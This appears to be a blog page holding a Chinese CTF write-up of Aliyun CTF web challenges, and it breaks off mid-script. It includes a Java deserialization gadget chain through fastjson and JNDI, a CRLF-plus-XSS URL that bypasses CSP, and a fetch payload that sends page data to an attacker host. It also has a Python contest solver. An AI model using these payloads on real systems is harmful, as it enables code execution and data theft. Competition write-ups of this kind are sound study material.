@@ -1,0 +1,529 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.2">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":null,"activeClass":"gitalk"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":5,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="ezBean">
+<meta property="og:type" content="article">
+<meta property="og:title" content="aliyunctf web">
+<meta property="og:url" content="http://example.com/2023/04/26/aliyunctf-web/index.html">
+<meta property="og:site_name" content="kaikaix">
+<meta property="og:description" content="ezBean">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2023/04/26/aliyunctf-web/1.png">
+<meta property="og:image" content="http://example.com/2023/04/26/aliyunctf-web/2.png">
+<meta property="article:published_time" content="2023-04-26T03:18:44.000Z">
+<meta property="article:modified_time" content="2023-06-21T20:06:27.000Z">
+<meta property="article:author" content="kaikaix">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="misc">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2023/04/26/aliyunctf-web/1.png">
+
+<link rel="canonical" href="http://example.com/2023/04/26/aliyunctf-web/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>aliyunctf web | kaikaix</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="kaikaix" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">kaikaix</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">小白</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <a href="https://github.com/kaikaix" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/04/26/aliyunctf-web/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/cat.jpg">
+      <meta itemprop="name" content="kaikaix">
+      <meta itemprop="description" content="小白">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="kaikaix">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          aliyunctf web
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-04-26 11:18:44" itemprop="dateCreated datePublished" datetime="2023-04-26T11:18:44+08:00">2023-04-26</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-06-22 04:06:27" itemprop="dateModified" datetime="2023-06-22T04:06:27+08:00">2023-06-22</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="ezBean"><a href="#ezBean" class="headerlink" title="ezBean"></a>ezBean</h2><span id="more"></span>
+<p>这题本来做出来了，但是本地一直没复现成功（不知道是不是fastjson1.2.60版本的原因）也没想着直接去打poc，就错失了300分</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj,String fieldname,Object value)</span><span class="keyword">throws</span></span><br><span class="line">            Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldname);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.setProperty(<span class="string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>, String.valueOf(<span class="literal">true</span>));</span><br><span class="line">        System.setProperty(<span class="string">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span>, String.valueOf(<span class="literal">true</span>));</span><br><span class="line">        <span class="type">JMXServiceURL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMXServiceURL</span>(<span class="string">&quot;service:jmx:rmi:///jndi/rmi://127.0.0.1:1099/el&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;URL: &quot;</span> + u + <span class="string">&quot;, connecting&quot;</span>);</span><br><span class="line">        <span class="type">RMIConnector</span> <span class="variable">c</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RMIConnector</span>((JMXServiceURL)u, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">MyBean</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyBean</span>();</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;conn&quot;</span>,c);</span><br><span class="line">        <span class="type">JSONArray</span> <span class="variable">jsonArray</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">        jsonArray.add(templates);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">val</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">123</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">valfield</span> <span class="operator">=</span> val.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        valfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        valfield.set(val, jsonArray);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        objectOutputStream.writeObject(val);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>如果用fastjson 1.2.60版本跑这个payload就会报<br>RMIConnector没有无参构造函数这个错误，搞得我想找平替RMIConnector的类，要满足以下三点</p>
+<ul>
+<li>有connect()函数</li>
+<li>实现了JMXConnector接口</li>
+<li>有无参构造的函数</li>
+</ul>
+<p>结果找了半天没找到<br>调用链如下，可以自己调试一下<br><code>BadAttributeValueExpException.readObject.toString -&gt; FastJSON -&gt; MyBean.getConnect -&gt; RMIConnector.connect -&gt; JNDI</code></p>
+<h2 id="obsidian"><a href="#obsidian" class="headerlink" title="obsidian"></a>obsidian</h2><p>做题的时候一直以为是这个软件的rce，然后在那边绕过询问弹框，用<br><a target="_blank" rel="noopener" href="https://forum.obsidian.md/t/possible-remote-code-execution-through-obsidian-uri-scheme/39743">https://forum.obsidian.md/t/possible-remote-code-execution-through-obsidian-uri-scheme/39743</a><br>这个poc去打rce，打的时候还一直在思考如果是这样搞的话，那为什么还需要xss➕绕过csp，结果最后还真的不是😂<br>当时还脑抽着想为什么他访问我的云服务器没有cookie</p>
+<p>接下来开始分析，破解suffix就不说了</p>
+<h3 id="crlf绕过csp加注入xss"><a href="#crlf绕过csp加注入xss" class="headerlink" title="crlf绕过csp加注入xss"></a>crlf绕过csp加注入xss</h3><p><img src="/2023/04/26/aliyunctf-web/1.png" alt><br>那么直接在nodeid后面加crlf注入，加xss就可以绕过csp，并且获得setcookie<br><code>http://比赛ip/note/123123%0d%0aA:B%0d%0a%0d%0a%3Cscript%3Ealert%28%2Fxss%2F%29%3C%2Fscript%3E%0d%0a%0d%0a</code><br>上面的链接就可以进行弹窗，而且页面会显示<br><img src="/2023/04/26/aliyunctf-web/2.png" alt><br>就是因为crlf把他本来的http响应弄成response text了<br>那么接下来就很明了了<br><code>http://比赛/note/123123%0d%0aA:B%0d%0a%0d%0a%3Cscript%3Efetch(&#39;%2Fblog&#39;).then((response)%20%3D%3E%20response.text()).then((data)%20%3D%3Ebtoa(data)).then((data)%20%3D%3Elocation.replace(%60http%3A%2F%2F</code>+ip+<code>%3A99%2F%3Fdata%3D%24%7Bdata%7D%60))%3C%2Fscript%3E%0d%0a%0d%0a</code><br>通过js注入<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;/blog&#x27;</span>)</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function">(<span class="params">response</span>) =&gt;</span> response.<span class="title function_">text</span>())</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function">(<span class="params">data</span>) =&gt;</span> <span class="title function_">btoa</span>(data))</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function">(<span class="params">data</span>) =&gt;</span> location.<span class="title function_">replace</span>(<span class="string">`http://ATTACKER/?data=<span class="subst">$&#123;data&#125;</span>`</span>))</span><br></pre></td></tr></table></figure></p>
+<h2 id="OOBdetection"><a href="#OOBdetection" class="headerlink" title="OOBdetection"></a>OOBdetection</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="comment"># 设置目标服务器的IP地址和端口</span></span><br><span class="line">ip_address = <span class="string">&quot;47.98.209.191&quot;</span></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个新的套接字（socket）</span></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接到目标服务器</span></span><br><span class="line">s.connect((ip_address, port))</span><br><span class="line">data = s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Received:&quot;</span>, data.decode())</span><br><span class="line"></span><br><span class="line">resp = data.decode()</span><br><span class="line">matchs1 = re.match(<span class="string">r&quot;sha256\(XXX(.*?)\)&quot;</span>, resp)</span><br><span class="line">code1 = matchs1.group(<span class="number">1</span>).split(<span class="string">&quot; &quot;</span>)[<span class="number">2</span>].split(<span class="string">&quot;)&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">code2 = resp.split(<span class="string">&quot;==&quot;</span>)[<span class="number">1</span>].strip()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;code1 : &quot;</span> + code1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;code2 : &quot;</span> + code2)</span><br><span class="line"><span class="comment"># 服务器提供的信息</span></span><br><span class="line">target_hash = code2</span><br><span class="line">salt = <span class="built_in">bytes</span>.fromhex(code1)</span><br><span class="line">data = s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Received:&quot;</span>, data.decode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re,os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NonNegativeIndexList</span>(<span class="title class_ inherited__">list</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__getitem__</span>(<span class="params">self, index</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(index, <span class="built_in">int</span>) <span class="keyword">and</span> index &lt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">raise</span> IndexError(<span class="string">&quot;Index cannot be negative&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>().__getitem__(index)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__setitem__</span>(<span class="params">self, index, value</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(index, <span class="built_in">int</span>) <span class="keyword">and</span> index &lt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">raise</span> IndexError(<span class="string">&quot;Index cannot be negative&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> index == <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">raise</span> Exception</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>().__setitem__(index, value)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">c_to_python_syntax</span>(<span class="params">c_code</span>):</span><br><span class="line">    array_pattern = <span class="string">r&quot;int\s+([a-zA-Z_][a-zA-Z0-9_]*)\s*\[([\sa-zA-Z0-9_+]*)\](?:\s*\[([\sa-zA-Z0-9_+]*)\])?;&quot;</span></span><br><span class="line">    assignment_pattern = <span class="string">r&quot;int\s+([a-zA-Z_][a-zA-Z0-9_]*)\s*=\s*([0-9]+);&quot;</span></span><br><span class="line"></span><br><span class="line">    array_match = re.match(array_pattern, c_code)</span><br><span class="line">    assignment_match = re.match(assignment_pattern, c_code)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> array_match:</span><br><span class="line">        var_name = array_match.group(<span class="number">1</span>)</span><br><span class="line">        first_dim = array_match.group(<span class="number">2</span>)</span><br><span class="line">        second_dim = array_match.group(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> second_dim:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;var_name&#125;</span> = NonNegativeIndexList([[None]*(<span class="subst">&#123;second_dim&#125;</span>)]*(<span class="subst">&#123;first_dim&#125;</span>))&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;var_name&#125;</span> = NonNegativeIndexList([None]*(<span class="subst">&#123;first_dim&#125;</span>))&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> assignment_match:</span><br><span class="line">        var_name = assignment_match.group(<span class="number">1</span>)</span><br><span class="line">        value = assignment_match.group(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;var_name&#125;</span> = <span class="subst">&#123;value&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Invalid C code provided&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">patch</span>(<span class="params"><span class="built_in">input</span></span>):</span><br><span class="line">    code_lines = <span class="built_in">input</span>.split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> code_line <span class="keyword">in</span> code_lines:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span>(code_line.find(<span class="string">&quot;int&quot;</span>)!=-<span class="number">1</span>):</span><br><span class="line">                <span class="keyword">if</span>(code_line.find(<span class="string">&quot;[&quot;</span>)!= -<span class="number">1</span>):</span><br><span class="line">                    <span class="built_in">exec</span>(c_to_python_syntax(code_line))</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">elif</span>(code_line.find(<span class="string">&#x27;=&#x27;</span>)!=-<span class="number">1</span>):</span><br><span class="line">                    <span class="built_in">exec</span>(code_line.replace(<span class="string">&#x27;int &#x27;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">exec</span>(code_line.replace(<span class="string">&#x27;int &#x27;</span>,<span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;;&#x27;</span>,<span class="string">&#x27;&#x27;</span>)+<span class="string">&#x27;=None&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">exec</span>(code_line) <span class="comment">#TypeError(未初始化)   IndexError（越界）   </span></span><br><span class="line">        <span class="keyword">except</span> TypeError <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">if</span>(e.args[<span class="number">0</span>].find(<span class="string">&#x27;list indices must be integers or slices&#x27;</span>)!=-<span class="number">1</span>):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;noboo&quot;</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;unknown&quot;</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;boo&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;noboo&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ifboo</span>(<span class="params"><span class="built_in">input</span></span>):</span><br><span class="line">    code = patch(<span class="built_in">input</span>) <span class="comment">#补全代码</span></span><br><span class="line">    <span class="keyword">return</span> code</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">prfint</span>(<span class="params"><span class="built_in">input</span></span>):</span><br><span class="line">    input_lists = <span class="built_in">input</span>.split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    new_code = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> input_list <span class="keyword">in</span> input_lists:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span>(input_list[-<span class="number">1</span>] == <span class="string">&#x27;;&#x27;</span>):</span><br><span class="line">                new_code += input_list+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">return</span> new_code</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍历所有可能的 XXX 值</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span> ** <span class="number">6</span>):</span><br><span class="line">    <span class="comment"># 将 i 转换成 16 进制字符串，左侧填充 0 到 6 位</span></span><br><span class="line">    xxx_hex = <span class="built_in">hex</span>(i)[<span class="number">2</span>:].zfill(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 计算哈希值</span></span><br><span class="line">    input_str = <span class="built_in">bytes</span>.fromhex(xxx_hex) + salt</span><br><span class="line">    hash_obj = hashlib.sha256(input_str)</span><br><span class="line">    hash_hex = hash_obj.hexdigest()</span><br><span class="line"></span><br><span class="line">    <span 